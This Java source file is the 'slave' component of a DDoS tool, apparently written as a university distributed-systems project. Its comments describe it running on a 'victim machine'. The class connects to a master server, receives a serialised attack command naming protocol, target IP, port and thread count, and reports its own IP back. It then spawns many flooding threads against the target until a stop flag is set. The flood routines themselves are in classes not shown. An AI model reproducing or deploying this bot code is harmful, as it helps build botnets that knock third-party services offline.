/**
 * FIRESEC TURBO FIRE
 * A stress network analysis tool.
 * ------------------------------------
 * Written by Lucas Fonseca dos Santos.
 * Copyleft 2018 - Rights not reserved.
 * ------------------------------------
 * 
 * Pratical project for discipline Distributed
 * Systems of Federal Univeristy of Lavras - MG,
 * Brazil.
 * 
 * CONTACT:
 * lucas@lcfcompany.com.br
 * github.com/LucasFonsecaDosSantos
 */
package app;

import java.util.concurrent.TimeUnit;

import view.GUI;
import utilies.AttackPattern;
import utilies.AttackFactory;
import utilies.SlaveResponse;
import tasks.StopServerThread;
import protocols.interfaces.Protocol;
import java.util.List;
import java.util.ArrayList;
import java.io.PrintWriter;
import java.io.InputStreamReader;
import java.io.NotSerializableException;
import java.io.BufferedReader;
import java.io.ObjectInputStream;
import java.lang.InterruptedException;
import java.io.Serializable;
import java.net.Socket;
import java.net.ServerSocket;
import java.net.SocketException;
import java.net.Inet4Address;

/**
 * @author Lucas Fonseca dos Santos
 * @author Otavio Andrade
 * @version 1.0
 * 
 * This class is the turbo fire slave executable version
 * of DDOS attack operation. It works into victim machine
 * executing a malicus command received by master turbo fire
 * executable version. The command receveid by this version
 * is a DDOS command with protocol, amount, force and target
 * system that will be attacked.
 */
public class TurboFireSlave implements Serializable {

    /**
     * The serial version of this object into JVM.
     */
    private static final long serialVersionUID = 1L;

    /**
     * A gui text interface.
     */
    private GUI gui;

    /**
     * Attack pattern mode with all DDOS settings.
     */
    private AttackPattern attackPattern;

    /**
     * IP master server address.
     */
    private String masterAddress;

    /**
     * Port for connection of master server.
     */
    private int masterPort;

    private ArrayList<Thread> attackThreads;

    private Thread serverStopThread;

    private static boolean stopAttackFlag;

    /**
     * The turbo fire slave version executable
     * constructor. It sets the gui instance and
     * start slave operation.
     * 
     * @param masterAddress The master server machine IP address.
     * @param masterPort The master server machine port.
     */
    public TurboFireSlave(String masterAddress, int masterPort) {
        this.attackThreads = new ArrayList<Thread>();
        stopAttackFlag = false;
        this.serverStopThread = null;
        this.gui = new GUI();
        this.masterAddress = masterAddress;
        this.masterPort = masterPort;
        startSlave();
    }

    /**
     * This method executs a slave turbo fire version and receives a malicius command
     * of master turbo fire version.
     */
    public void startSlave() {
        while(true) {
            try {
                Socket socket = new Socket(this.masterAddress, this.masterPort);
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                this.attackPattern = (AttackPattern) ois.readObject();
                this.gui.showMessage("Command Received from Master!");
                for(int i=1 ; i < 16 ; i++) {
                    TimeUnit.SECONDS.sleep(1);
                    if(i%3 == 1) {
                        this.gui.clean();
                        this.gui.showSkull();
                        this.gui.showMessage("Initializing Attack Operation .");
                    }else if(i%3 == 2) {
                        this.gui.clean();
                        this.gui.showSkull();
                        this.gui.showMessage("Initializing Attack Operation ..");
                    }else if(i%3 == 0) {
                        this.gui.clean();
                        this.gui.showSkull();
                        this.gui.showMessage("Initializing Attack Operation ...");
                    }else if(i == 15) {
                        this.gui.showMessage(
                            "Attack Command: " + this.attackPattern.getProtocol() + " | " + this.attackPattern.getIP() + " | " + 
                            this.attackPattern.getPort() + " | " + this.attackPattern.getThreadAmount() + " | " +
                            this.attackPattern.getMessage()
                        );
                    }
                }
                
                ois.close();
                this.attackPattern.setAdditionalInformation(Inet4Address.getLocalHost().getHostAddress().toString());
                for(int i = 0 ; i < this.attackPattern.getThreadAmount() ; i++) {
                    Thread t = new Thread(AttackFactory.createAttack(this.attackPattern, this.masterAddress, 2525));
                    t.start();
                    this.attackThreads.add(t);
                }
                this.serverStopThread = new Thread(new StopServerThread(this.masterAddress));
                this.serverStopThread.start();
                while(true) {
                    if(this.stopAttackFlag) {
                        this.gui.clean();
                        for(Thread t : this.attackThreads) {
                            t.interrupt();
                            GUI.showMessage("Thread Operation Interrupt!");
                        }
                        GUI.errorMessage("The attack has been interruped! ");
                        this.gui.pressEnterToContinue();
                        System.exit(0);
                        break;
                    }else {
                        this.gui.showMessage("TCP Flooding...");
                        continue;
                    }
                }
                
                break;
            }catch (InterruptedException ie) {
                this.gui.showExceptionLog(ie.toString());
            } catch (SocketException se) {
                this.gui.showExceptionLog(se.toString());
            } catch (NotSerializableException nse) {
                this.gui.showExceptionLog(nse.toString());
            } catch (Exception e) {
                this.gui.showExceptionLog(e.toString());
            }
        }
    }

    /**
     * The attack flag attribute state modifier static 
     * method.
     * 
     * @param status A boolean flag for attack.
     */
    public static void setAttackFlag(boolean status) {
        stopAttackFlag = status;
    }
}